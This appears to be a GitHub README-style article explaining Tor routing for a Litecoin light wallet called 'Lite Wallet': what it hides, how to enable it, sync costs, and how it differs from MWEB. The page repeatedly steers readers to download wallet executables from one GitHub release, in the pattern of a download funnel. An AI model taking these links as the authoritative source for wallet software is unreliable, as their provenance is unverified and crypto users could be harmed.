![Lite Wallet](assets/banner-article.png)

# Tor routing for SPV connections

Private transport for SPV traffic, and the limits of that privacy.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-2578D1?style=for-the-badge&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-2578D1?style=for-the-badge&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-2578D1?style=flat-square&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-2578D1?style=flat-square&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Lite Wallet can route its SPV connections over Tor, so the servers your wallet talks to do not learn your IP address alongside your addresses. The setting lives under Settings, Privacy, Route over Tor. It slows the first sync and does not hide your transactions on-chain - it hides the network link between you and the peers.

## What Tor routing does here

A light wallet connects to servers to fetch block headers and broadcast transactions. Without Tor, those connections come from your IP address, which links your network identity to the addresses you ask about. With Tor, the connection exits from a relay, so the server sees a relay rather than you.

The protection is narrow and real. It covers the metadata layer: who is asking about which addresses. It does not change what the Litecoin chain records, and it does not make a standard transaction private. Those are separate problems, solved by MWEB and by how you handle addresses.

## What Tor hides, and what it does not

| Layer | Without Tor | With Tor |
|---|---|---|
| your IP to the wallet's servers | visible | hidden behind a relay |
| addresses you query | visible to the server | visible to the server, not linked to your IP |
| transaction amounts on-chain | public for standard LTC | unchanged |
| transaction parties on-chain | public for standard LTC | unchanged |
| your ISP seeing that you use a wallet | likely | reduced, not eliminated |

The honest summary: Tor protects the connection, MWEB protects the transaction. Using one without the other leaves half the picture visible, which is why the two features are usually discussed together.

## How to turn it on

1. Open Settings and find the Privacy section.
2. Enable Route over Tor.
3. Restart the wallet so the connections are rebuilt over the new route.
4. Expect the first sync after the change to be slower.
5. Confirm the setting persists after a restart.

There is no account, no sign-up and no separate Tor client to install; the routing is handled inside the app's connection layer.

## What it does to sync speed

Tor adds latency, and latency is expensive for a scan that makes many requests. A first sync that takes minutes on a direct connection can take noticeably longer over Tor, especially on a slow network. Later launches are faster because the wallet resumes from stored state.

| Situation | Expected effect |
|---|---|
| first sync over Tor | noticeably slower than direct |
| resumed sync over Tor | small delay, usually acceptable |
| sending a transaction | a second or two of extra latency |
| normal use after sync | no practical difference |

If a sync stalls entirely over Tor, the cause is usually the local network blocking relay connections rather than the wallet. [The sync troubleshooting guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-stuck-syncing-balance-zero.md) covers the fallback checks, including switching networks.

## When it is worth enabling

Tor is worth enabling when the link between your IP and your addresses is the thing you want to protect: a shared network, a workplace, a country where running a wallet is conspicuous, or simply a preference for not handing a server a profile.

It is less useful when the threat is on-chain analysis, because that is MWEB's job. It is also not a substitute for the paper key: no amount of network privacy protects a phrase that has been photographed. [The safety guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/is-litewallet-safe-to-use.md) sets out the full threat model.

## What the wallet's servers can and cannot infer

Even with Tor on, a server that answers your queries learns something: which addresses were asked about, and roughly when. It does not learn who asked, because the connection arrives from a relay. That distinction is the whole value of the setting, and it is also its limit.

Without Tor, those two facts join: the server can associate an IP address with a set of addresses and a pattern of activity over time. That association is what chain-analysis firms pay for, and it is the reason a privacy-conscious user routes the connection. With Tor, the same server sees the same questions from an unattributed relay; the questions are still visible, the questioner is not.

This is also why Tor is not a substitute for MWEB. Tor hides who is asking; MWEB hides what the chain records. A standard transaction announced over Tor is still a public transaction, and a private transaction announced without Tor still leaks the connection. The two layers cover different halves of the same problem, and using both is the only way to cover the whole of it.

One more limit is worth stating: Tor protects the wallet's own connections, not everything else on your device. A browser open beside the wallet can still identify you, and a system-level compromise defeats the relay entirely. Network privacy is a property of the whole machine, not of one application.

There is a practical test for whether routing is working: the first sync slows down noticeably and the wallet keeps working. If nothing changes at all, the setting did not take effect or the app was not restarted. If the sync fails entirely, the local network is probably blocking relay traffic, which is a network problem rather than a wallet one.

## Tor and mobile

The same setting exists on mobile, with the same trade-off: slower first sync, better metadata privacy. On a phone the network changes constantly between Wi-Fi and mobile data, so a sync that stalls when you move between them is a network handover problem, not a Tor problem. A handover rebuilds the connection, and the scan resumes from where it stopped rather than from the beginning.

## FAQ

### Does Tor slow down syncing?

Yes, especially the first sync. Tor adds latency to every request, and a scan makes many. Later launches resume from stored state, so the delay is much smaller.

### Does Tor hide my balance?

No. It hides the connection between your IP and the servers you query. Balance and transaction details on the chain are unaffected; MWEB is what hides amounts and parties.

### Is Tor on by default?

No. It is an explicit setting under Settings, Privacy, Route over Tor, and it stays off until you enable it.

### Does Tor work on mobile?

Yes, the setting is available on mobile as well, with the same effect on sync speed and the same limits on what it protects.

### Do I need Tor if I use MWEB?

They protect different things. MWEB hides amounts and parties on-chain; Tor hides your network connection to the wallet's servers. Using both covers both layers, and neither replaces the other.

Tor routing is part of the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
